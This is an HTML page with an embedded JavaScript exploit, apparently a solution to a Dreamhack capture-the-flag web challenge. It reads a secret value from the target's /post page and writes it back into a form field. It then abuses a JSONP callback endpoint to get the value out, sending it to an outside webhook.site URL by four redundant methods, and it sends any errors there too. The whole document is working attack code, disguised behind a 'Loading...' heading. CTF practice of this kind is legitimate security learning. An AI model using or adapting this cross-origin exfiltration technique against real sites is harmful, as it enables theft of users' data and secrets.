<!DOCTYPE html>
<html>
<body>
<h1>Loading...</h1>
<script>
const WEBHOOK = 'https://webhook.site/c9d4a3d0-88aa-45d5-8c8a-6c317e3f2bd1';

async function exploit() {
  try {
    // Step 1: GET /post
    console.log('[1] Fetching /post...');
    const resp = await fetch('http://host8.dreamhack.games:9182/post');
    const html = await resp.text();
    
    // Extract FLAG
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');
    const flag = doc.querySelector('#info_value').value;
    console.log('[2] FLAG:', flag);
    
    // Step 2: POST to save FLAG in info_value
    console.log('[3] Saving to info_value...');
    const formData = new FormData();
    formData.append('info_value', flag);
    
    await fetch('http://host8.dreamhack.games:9182/post', {
      method: 'POST',
      body: formData
    });
    
    console.log('[4] Saved! Waiting...');
    await new Promise(resolve => setTimeout(resolve, 1500));
    
    // Step 3: JSONP callback
    console.log('[5] Loading JSONP...');
    window.exfiltrate = function(data) {
      console.log('[6] Callback triggered!', data);
      
      // 방법 1: fetch (promise로 완료 보장)
      fetch(WEBHOOK + '?flag=' + encodeURIComponent(data.info))
        .then(() => console.log('Fetch sent!'))
        .catch(e => console.error('Fetch error:', e));
      
      // 방법 2: sendBeacon (가장 확실함)
      if (navigator.sendBeacon) {
        const sent = navigator.sendBeacon(WEBHOOK + '?beacon=' + encodeURIComponent(data.info));
        console.log('Beacon sent:', sent);
      }
      
      // 방법 3: Image (항상 작동)
      const img = new Image();
      img.onload = () => console.log('Image sent!');
      img.onerror = () => console.log('Image error');
      img.src = WEBHOOK + '?img=' + encodeURIComponent(data.info);
      
      // 방법 4: XHR 동기 요청 (마지막 수단)
      try {
        const xhr = new XMLHttpRequest();
        xhr.open('GET', WEBHOOK + '?xhr=' + encodeURIComponent(data.info), false); // false = 동기
        xhr.send();
        console.log('XHR sent!');
      } catch(e) {
        console.error('XHR error:', e);
      }
    };
    
    const script = document.createElement('script');
    script.src = 'http://host8.dreamhack.games:9182/callback?callback=window.exfiltrate';
    document.body.appendChild(script);
    
  } catch(e) {
    console.error('Error:', e);
    // 에러도 전송
    new Image().src = WEBHOOK + '?error=' + encodeURIComponent(e.message);
  }
}

exploit();
</script>
</body>
</html>
